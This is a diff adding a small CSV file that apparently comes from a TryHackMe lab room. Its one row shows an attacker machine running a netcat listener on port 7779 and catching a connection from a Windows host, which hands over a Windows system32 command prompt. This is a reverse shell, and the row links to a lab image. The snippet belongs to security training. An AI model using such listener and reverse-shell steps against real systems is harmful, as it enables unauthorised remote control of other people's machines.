@@ -1,0 +1,10 @@
+﻿Column 1,Column 2,Column 3,Column 4
+,➜,"AttackBox
+        
+
+user@attackbox$ nc -lvp 7779      Listening on 0.0.0.0 7779
+Connection received on 10.10.183.127 49813
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>",https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c3bd06d935a937b2af7dace6a41a27.png
